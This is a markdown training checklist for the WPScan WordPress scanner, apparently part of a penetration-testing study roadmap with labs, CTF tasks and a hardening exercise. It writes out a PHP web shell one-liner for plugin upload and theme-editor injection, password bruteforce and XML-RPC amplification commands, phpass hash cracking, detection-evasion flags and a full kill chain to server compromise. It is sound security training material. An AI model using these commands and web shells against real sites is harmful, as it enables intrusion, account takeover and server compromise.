# 🔫 WPScan: Complete Mastery Checklist

> **What is WPScan?** WPScan is a WordPress-specific vulnerability scanner. It fingerprints a WordPress installation — version, plugins, themes, users — and checks each component against the WPScan Vulnerability Database (WPVulnDB). It identifies: vulnerable plugin versions with known CVEs, weak/missing security configurations, exposed user enumeration, and default/common credentials via its bruteforce module.
>
> **Why does it exist?** WordPress powers over 40% of all websites. Most WordPress vulnerabilities come from outdated plugins and themes, not the core. WPScan knows the WordPress ecosystem deeply — it understands where to find version strings, which endpoints expose user data, and what each plugin/theme version is vulnerable to. Generic scanners miss most of this.
>
> **When to use it:** Any engagement involving a WordPress site. Bug bounty on WordPress targets. CTF machines running WordPress. Checking your own WordPress installation for vulnerabilities.
>
> **When to avoid it:** Non-WordPress sites (it's WordPress-only). When the API token is needed for full vulnerability data and you don't have one (free tier is limited).
>
> **What mastering WPScan unlocks:** WordPress attack surface enumeration. Plugin/theme CVE identification. User enumeration for password attacks. Understanding of the WordPress security model and common attack patterns.

---

## 🧭 Navigation

> [🏠 Home](../README.md) · [📋 Roadmap](../Roadmap/README.md)

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Fundamentals | 4 | 1–2 hours |
| 2 | Enumeration | 5 | 2–3 hours |
| 3 | Vulnerability Detection | 4 | 2–3 hours |
| 4 | Password Attacks | 4 | 2–3 hours |
| 5 | Evasion | 3 | 1–2 hours |
| 6 | Post-Exploitation | 3 | 1–2 hours |
| 7 | Practical Labs | 3 | 3–5 hours |
| 8 | Mastery Challenges | 2 | 2–3 hours |
| | **Total** | **28** | **~14–23 hours** |

---

# PHASE 1: FUNDAMENTALS

---

### Task 1.1 — WordPress Architecture for Attackers

- [ ] **Completed** · ⭐ Beginner · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Core** | WordPress CMS core files. CVEs less common here — heavily audited. |
| **Plugins** | `/wp-content/plugins/plugin-name/`. Most vulnerabilities are here — thousands of plugins, varying quality. |
| **Themes** | `/wp-content/themes/theme-name/`. Less common CVEs but still present. |
| **wp-login.php** | Login page. Target for bruteforce and username enumeration. |
| **xmlrpc.php** | XML-RPC API — legacy. Allows bruteforce amplification (one request = many auth attempts). Often left enabled. |
| **wp-admin/** | Admin dashboard. File upload, plugin install = RCE if accessible. |
| **wp-json/wp/v2/users** | REST API endpoint exposing all user IDs and slugs by default. |

---

### Task 1.2 — Installation and API Key

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Kali** | `apt install wpscan`. |
| **Gem** | `gem install wpscan`. |
| **API Token** | Register at `wpscan.com` → get free API token (25 requests/day free). `wpscan --api-token TOKEN`. Without token: vulnerability data not shown, only version/enumeration. |
| **Config** | `~/.wpscan/scan.yml` — store token here: `cli_options:\n  api_token: TOKEN`. |

---

### Task 1.3 — Basic Syntax

- [ ] **Completed** · ⭐ Beginner · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Basic** | `wpscan --url http://target.com`. |
| **With Token** | `wpscan --url http://target.com --api-token TOKEN`. |
| **Enumerate** | `-e` flag: `p` = plugins, `t` = themes, `u` = users, `vp` = vulnerable plugins, `vt` = vulnerable themes, `ap` = all plugins, `at` = all themes. |
| **Output** | `-o report.json --format json`. `-o report.txt --format cli`. |

---

### Task 1.4 — Detection Mode

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Passive** | `--detection-mode passive` — only reads headers and HTML, no active probing. Stealthy but less thorough. |
| **Mixed** | `--detection-mode mixed` — default. Passive first, then targeted active requests. |
| **Aggressive** | `--detection-mode aggressive` — most active. Finds more plugins/themes but generates more traffic and noise. |

---

# PHASE 2: ENUMERATION

---

### Task 2.1 — WordPress Version Detection

- [ ] **Completed** · ⭐ Beginner · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **How** | Version found in: generator meta tag, RSS feeds, readme.html, readme files. WPScan checks all of these. |
| **Action** | If version found: check WPVulnDB for known core vulnerabilities. `readme.html` is especially useful — remove it in hardened installations. |

---

### Task 2.2 — Plugin Enumeration

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Vulnerable Only** | `wpscan --url target --enumerate vp --api-token TOKEN` — only enumerate vulnerable plugins. |
| **All Plugins** | `wpscan --url target --enumerate ap` — enumerate all plugins (slower, more thorough). |
| **What It Finds** | Plugin name, installed version, latest version, CVEs with CVSS scores and exploit links. |
| **Aggressive** | `--plugins-detection aggressive` — more thorough plugin detection. |

---

### Task 2.3 — Theme Enumeration

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Command** | `wpscan --url target --enumerate vt --api-token TOKEN` — vulnerable themes. |
| **What It Finds** | Active theme, child theme, parent theme, version, known CVEs. |

---

### Task 2.4 — User Enumeration

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Command** | `wpscan --url target --enumerate u`. |
| **Methods** | Author archives (`?author=1`). REST API (`/wp-json/wp/v2/users`). Login error messages (some configs). |
| **Output** | Username(s) discovered: `admin`, `editor`, `johndoe`. |
| **Use** | Feed usernames into password bruteforce. |
| **Hardening** | Disable REST API user endpoint. Suppress author archives. Generic login errors ("Invalid credentials"). |

---

### Task 2.5 — Full Enumeration

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Command** | `wpscan --url target --enumerate vp,vt,u --api-token TOKEN --detection-mode aggressive`. |
| **Everything** | `--enumerate ap,at,tt,cb,dbe,u,m` — all plugins, all themes, timthumbs, config backups, database exports, users, media. |

---

# PHASE 3: VULNERABILITY DETECTION

---

### Task 3.1 — API Token and VulnDB

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Token** | Without token: enumeration works but no vulnerability data shown. With token: CVE details, CVSS scores, exploit URLs, fix version shown for each vulnerable component. |
| **Free Limit** | 25 API calls per day on free tier. Each scan uses some API calls. Use efficiently. |
| **Output** | `[!] 3 vulnerabilities identified in plugin: contact-form-7 (version 5.1.1)`. Each with: title, CVE, CVSS, fixed version, references. |

---

### Task 3.2 — Plugin CVE Exploitation

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Workflow** | WPScan finds `Plugin: wpforms (3.6.4) - CRITICAL: Unauthenticated SQL Injection (CVE-2023-XXXX)`. Look up the CVE. Find PoC or Metasploit module. Verify on the target. Exploit. |
| **Searchsploit** | `searchsploit wpforms` — find available exploits. |
| **ExploitDB** | `exploitdb.com` — search by plugin name and CVE. |

---

### Task 3.3 — Timthumbs

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **What** | TimThumb is a PHP image resizing script used by many themes. Old versions (< 2.8.13) have remote file inclusion vulnerabilities. |
| **Enumerate** | `wpscan --url target --enumerate tt`. |
| **Exploit** | If vulnerable version found and `allow_url_fopen` enabled: remote PHP file inclusion → RCE. |

---

### Task 3.4 — Config Backup Discovery

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Command** | `wpscan --url target --enumerate cb` — check for `wp-config.php` backup files. |
| **What It Finds** | `wp-config.php.bak`, `wp-config.php~`, `wp-config.php.old` — contain database credentials. |
| **Impact** | Database credentials → direct DB access → all user hashes → admin password crack → RCE. |

---

# PHASE 4: PASSWORD ATTACKS

---

### Task 4.1 — WordPress Login Bruteforce

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **Command** | `wpscan --url target -U admin -P /usr/share/wordlists/rockyou.txt`. |
| **Multiple Users** | `-U users.txt -P wordlist.txt`. |
| **Rate Limit** | `--throttle 1000` — 1000ms between requests. Avoids triggering lockout. |

---

### Task 4.2 — XML-RPC Amplification

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Concept** | `xmlrpc.php` `system.multicall` method allows trying multiple credentials in a single HTTP request — amplifies bruteforce speed and evades per-request rate limiting. |
| **WPScan** | WPScan automatically uses XML-RPC if enabled: `--password-attack xmlrpc`. Tries 100+ passwords per request. |
| **Check XML-RPC** | WPScan reports if XML-RPC is enabled. Manual check: `curl -X POST http://target/xmlrpc.php -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'`. |

---

### Task 4.3 — Targeted User Attack

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Workflow** | Enumerate users → get `admin`, `editor` → target admin first with rockyou.txt. If admin uses a strong password: try editor or other low-priv users. Low-priv account → install malicious plugin → RCE if editor+ role. |

---

### Task 4.4 — Cracking wp_users Hashes

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Access Method** | Via SQLi vulnerability or direct DB access (from found db credentials). `SELECT user_login, user_pass FROM wp_users;`. |
| **Hash Format** | WordPress uses phpass (portable PHP password hashing). `$P$B...`. |
| **Crack** | `hashcat -m 400 wp_hashes.txt rockyou.txt`. Or JtR: `john --format=phpass --wordlist=rockyou.txt wp_hashes.txt`. |

---

# PHASE 5: EVASION

---

### Task 5.1 — Reducing Noise

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **Passive Mode** | `--detection-mode passive` — only passive requests. Less detectable. |
| **Custom User-Agent** | `--user-agent "Mozilla/5.0 (compatible; Googlebot/2.1)"`. |
| **Throttle** | `--throttle 2000` — 2-second delay. |
| **Random Agent** | `--random-user-agent`. |

---

### Task 5.2 — Proxy

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Burp** | `--proxy http://127.0.0.1:8080` — see all WPScan requests in Burp. |
| **Tor** | `--proxy socks5://127.0.0.1:9050`. |

---

### Task 5.3 — Cookie Authentication

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 10 min

| Field | Detail |
|:---|:---|
| **Logged-in Scan** | `wpscan --url target --cookie "wordpress_logged_in_xxx=value"`. Scan as an authenticated user — finds more plugins/themes and authenticated vulnerabilities. |

---

# PHASE 6: POST-EXPLOITATION

---

### Task 6.1 — Admin to RCE via Plugin Upload

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 25 min

| Field | Detail |
|:---|:---|
| **If Admin** | WordPress admin → Plugins → Add New → Upload Plugin → upload malicious plugin ZIP. Plugin contains PHP webshell. Activate → shell at `/wp-content/plugins/shell/shell.php`. |
| **Craft Plugin** | Minimal plugin ZIP: `shell.php` with `<?php system($_GET['cmd']); ?>` wrapped in WordPress plugin header comment. |
| **Metasploit** | `use exploit/unix/webapp/wp_admin_shell_upload` — automated. |

---

### Task 6.2 — Theme Editor RCE

- [ ] **Completed** · ⭐⭐⭐ Intermediate · ⏱️ 15 min

| Field | Detail |
|:---|:---|
| **If Admin** | Appearance → Theme Editor → edit `404.php` → inject PHP code → visit `/?p=404`. |
| **Code** | `<?php system($_GET['cmd']); ?>` in theme template file. |

---

### Task 6.3 — Credential Escalation Chain

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 20 min

| Field | Detail |
|:---|:---|
| **Chain** | WPScan finds vuln plugin → SQLi → dump wp_users → crack phpass → login as admin → plugin upload → webshell → system RCE → escalate to OS user → full server compromise. |

---

# PHASE 7: PRACTICAL LABS

---

### Lab 7.1 — WPScan on Local WordPress

- [ ] **Completed** · ⭐⭐ Beginner-Intermediate · ⏱️ 20 min

| **Scenario** | Install WordPress locally (or use a TryHackMe WordPress machine). Run full WPScan with API token. Document: version, plugins found, themes found, users found, vulnerabilities. |
| **Success Criteria** | Full inventory documented. At least 1 vulnerability identified. |

---

### Lab 7.2 — Exploit Plugin Vulnerability

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| **Scenario** | CTF or lab WordPress install with a vulnerable plugin (e.g., bWAPP WordPress lab, HTB machine). WPScan identifies the CVE. Find and execute the exploit. Achieve code execution. |
| **Success Criteria** | Plugin CVE exploited. RCE achieved. |

---

### Lab 7.3 — Password Attack + Admin Shell

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 30 min

| **Scenario** | Lab WordPress with weak admin password. Enumerate users with WPScan. Bruteforce admin password. Log in. Upload malicious plugin. Get RCE. |
| **Success Criteria** | Admin password cracked via WPScan bruteforce. RCE achieved via plugin upload. |

---

# PHASE 8: MASTERY CHALLENGES

---

### Challenge 8.1 — Full WordPress Kill Chain

- [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 90 min

| **Scenario** | Starting from Nmap discovery: identify WordPress → WPScan → find CVE or credential → exploit → RCE → OS-level shell → flag. Document every step of the chain with commands and screenshots. |
| **Success Criteria** | Complete kill chain documented. OS-level shell achieved. |

---

### Challenge 8.2 — WordPress Hardening Report

- [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 45 min

| **Scenario** | Run WPScan against a WordPress installation. Write a hardening report: disable xmlrpc.php, remove readme.html, update all plugins/themes, fix missing security headers, hide WP version, harden wp-login.php. Implement the fixes. Re-run WPScan to verify improvements. |
| **Success Criteria** | All findings addressed. Re-scan shows reduced attack surface. |

---

# 📋 FINAL COMPETENCY MATRIX

| Competency | Self-Assessment |
|:---|:---:|
| Can enumerate WordPress version, plugins, themes, and users | ☐ |
| Can identify vulnerable plugins with CVE details using API token | ☐ |
| Can perform user enumeration via author archives and REST API | ☐ |
| Can bruteforce WordPress login with WPScan | ☐ |
| Can use XML-RPC amplification for faster bruteforce | ☐ |
| Can crack WordPress phpass hashes | ☐ |
| Can achieve RCE via admin plugin upload | ☐ |
| Understands WordPress hardening countermeasures | ☐ |
| Can integrate WPScan into a full engagement workflow | ☐ |

---

## 🎯 Interview Questions

1. What does WPScan enumerate and why is it WordPress-specific?
2. What is XML-RPC amplification and how does WPScan exploit it?
3. How do you enumerate WordPress users and what endpoints does WPScan check?
4. What do you do with discovered WordPress credentials?
5. How do you escalate from WordPress admin to OS code execution?
6. What is a WPScan API token and what does it unlock?
7. How do you crack WordPress phpass hashes?
8. What are three WordPress hardening steps that reduce WPScan findings?
